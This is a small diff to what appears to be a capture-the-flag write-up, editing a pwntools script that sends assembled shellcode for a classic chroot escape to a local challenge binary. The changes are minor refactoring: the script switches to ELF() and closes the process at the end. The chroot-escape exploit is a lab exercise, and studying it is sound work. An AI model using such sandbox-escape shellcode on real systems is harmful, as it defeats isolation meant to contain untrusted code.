@@ -103,11 +103,10 @@ The vulnerability relies on how the kernel handles directory traversal when `chr
 ```python
 from pwn import *
 
-exe = "./challenge"
-context.binary = exe
+elf = context.binary = ELF("./challenge")
 
 # Pass '/' to leak the root FD (though we might not need it for this escape)
-p = process([exe, "/"])
+p = process([elf.path, "/"])
 
 # Shellcraft for Classic Chroot Escape
 # 1. mkdir("esc")
@@ -129,4 +128,5 @@ shellcode = asm(sc)
 p.send(shellcode)
 
 print(p.recvall(timeout=1).decode())
+p.close()
 ```
